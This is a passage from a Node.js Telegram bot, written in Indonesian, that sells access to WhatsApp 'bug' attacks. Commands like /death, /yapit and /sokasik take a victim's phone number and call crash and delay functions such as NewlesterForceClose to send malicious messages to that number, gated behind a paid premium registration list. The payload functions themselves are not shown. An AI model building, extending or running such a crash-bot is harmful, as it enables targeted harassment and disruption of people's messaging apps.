          "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
        );
      }

      await bot.editMessageReplyMarkup(
        { inline_keyboard: [[{ text: "Sedang Proses 🔄...", callback_data: "processing" }]] },
        { chat_id: chatId, message_id: messageId }
      );

      let bugType;

      if (action === "xlobug") {
        await delayBrutal(24, jid);
        bugType = "Noxa-ᴅᴇʟᴀʏ";
      } else if (action === "vxcrash_proto") {
        await protocol(24, jid);
        bugType = "Noxa-ᴘʀᴏᴛᴏᴄᴏʟ";
      } else if (action === "xlobug") {
        await delayUI(24, jid);
        bugType = "Noxa-ᴅᴇʟᴀʏ-ᴜɪ";
      } else if (action === "bloxus") {
        await delayUI(24, jid);
        bugType = "xnish-combk";
      } else if (action === "vxblank") {
        await brutalDelay(24, jid);
        bugType = "delay-only";
      } else if (action === "vxcrash") {
        await delayonly(24, jid);
        bugType = "proto-view";
      } else if (action === "vxcrash_protoview") {
        await brutalDelay(24, jid);
        bugType = "delay-super";
      } else if (action === "vxcrash_super") {
        await brutalDelay(24, jid);
        bugType = "delay-extrime";
      } else if (action === "bombug🚨") {
        await forcexata(24, jid);
        bugType = "crash-brutal";
      } else {
        return bot.sendMessage(chatId, "❌ Unknown action.");
      }

      setTimeout(async () => {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [[{ text: "𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥𝘪𝘯𝘨 𝘉𝘶𝘨✅", callback_data: "sent" }]] },
          { chat_id: chatId, message_id: messageId }
        );
      }, 7000); // 

    } catch (error) {
      bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    }
  }
});

bot.onText(/\/turudek (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Veptzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, randomImage, {
      caption: `
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayonly(24, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 100%
- Target : ${formattedNumber}
- status : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   




bot.onText(/\/sokasik (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@newsletter`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);


  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Depisz" }]
      ]
    }
  });
}
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, randomImage, {
      caption: `
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await NewlesterForceClose(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 100%
- Target : ${formattedNumber}
- status : Succes send bug🦠
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   




bot.onText(/\/yapit (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", {
    caption: `\`\`\`アクセスできません!\`\`\`
( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di tombol di bawahh
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Depisz" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, randomImage, {
      caption: `
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await memek(24, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 100%
- Target : ${formattedNumber}
- status : Succes send bug🦠
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   




bot.onText(/\/death (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", {
    caption: `\`\`\`アクセスできません!\`\`\`
( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di tombol di bawahh
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Depisz" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, randomImage, {
      caption: `
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await what(24, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 100%
- Target : ${formattedNumber}
- status : Succes send bug🦠
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
   

//=======plugins=======//
bot.onText(/^\/privacy (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Only Group* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});


bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/cdmurbug (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/regis(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add regist users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /regis 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /regis 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /regis 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekregis/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the regis list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delsup(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove regis users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delsup 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
 *Informasi Channel WhatsApp*
 *ID:* ${result.id}
 *Nama:* ${result.name}
 *Total Pengikut:* ${result.subscribers}
 *Status:* ${result.status}
 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});